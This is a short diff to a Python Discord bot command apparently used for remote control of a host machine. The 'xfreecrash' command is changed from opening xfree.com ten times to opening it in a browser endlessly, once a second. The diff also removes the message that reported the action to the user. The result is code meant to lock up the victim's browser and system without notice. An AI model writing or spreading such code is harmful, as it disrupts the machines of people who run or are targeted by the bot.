@@ -257,10 +257,9 @@ async def download_file(ctx, *, file_path: str):
 @bot.command(name='xfreecrash')
 async def xfree_crash(ctx):
     try:
-        for _ in range(10): 
+        while True:
             webbrowser.open("https://xfree.com")
             await asyncio.sleep(1)
-        await ctx.send("Opened xfree.com multiple times. Browser might become unresponsive.")
     except Exception as e:
         await ctx.send(f"Error opening xfree.com: {e}")
 
